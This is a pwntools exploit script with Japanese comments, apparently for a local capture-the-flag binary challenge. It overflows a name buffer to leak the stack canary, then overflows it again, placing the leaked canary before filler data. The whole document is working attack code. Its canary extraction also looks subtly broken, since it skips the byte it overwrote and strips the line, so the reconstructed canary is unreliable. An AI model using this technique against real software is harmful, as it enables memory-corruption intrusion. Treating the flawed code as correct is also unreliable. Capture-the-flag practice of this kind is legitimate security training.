from pwn import *

# ローカル実行
p = process("./chal")

# =====================
# 1 回目: カナリアをリーク
# =====================
p.recvuntil(b"What's your name?\n> ")

payload1 = b"A" * 104 + b"\x04"
p.send(payload1)

# "Your input is " の後に入力内容がそのまま出るので、
# 続く 8 バイトがカナリアとしてリークされる
p.recvuntil(b"Your input is ")
leak_line = p.recvline().strip()

# リーク部分を抽出
# payload と同じ長さ（104 + 1 = 105 バイト）をスキップ
canary = leak_line[105:105+8]

log.success(f"Leaked canary: {canary.hex()}")

# "Is this okay (Y/n) ?" に対して "n" を送る
p.recvuntil(b"Is this okay (Y/n) ?")
p.sendline(b"n")

# =====================
# 2 回目: カナリアを使って攻撃
# =====================
p.recvuntil(b"What's your name?\n> ")

payload2  = b"B" * 104
payload2 += canary                    # 保存したカナリア
payload2 += p64(0xdeadbeefdeadbeef)   # 任意の追加データ

p.send(payload2)

p.recvuntil(b"Is this okay (Y/n) ?")
p.sendline(b"Y")

# 出力確認
print(p.recvall().decode(errors='ignore'))
